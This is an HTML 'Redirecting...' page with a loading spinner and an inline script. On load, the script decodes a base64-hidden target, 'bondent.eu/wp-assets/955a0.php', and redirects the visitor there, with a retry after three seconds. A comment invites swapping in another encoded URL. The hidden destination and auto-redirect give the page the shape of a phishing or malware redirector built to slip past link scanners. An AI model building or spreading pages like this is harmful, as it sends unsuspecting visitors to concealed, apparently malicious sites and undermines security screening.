<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #f8f9fa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #3498db;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        (function() {
            // Base64 encoded URL of the final destination
            const encodedUrl = "Ym9uZGVudC5ldS93cC1hc3NldHMvOTU1YTAucGhw"; // Replace with your encoded URL

            // Decode the Base64 encoded URL
            function decodeBase64(encoded) {
                try {
                    return atob(encoded);
                } catch (e) {
                    console.error("Failed to decode Base64 URL", e);
                    return null;
                }
            }

            // Perform the redirect
            function performRedirect() {
                const decodedUrl = decodeBase64(encodedUrl);
                if (decodedUrl) {
                    window.location.replace(decodedUrl);
                } else {
                    console.error("Invalid URL");
                }
            }

            // Execute the redirect immediately
            performRedirect();

            // Fallback: Retry the redirect after 3 seconds if it fails
            setTimeout(() => {
                performRedirect();
            }, 3000);
        })();
    </script>
</body>
</html>
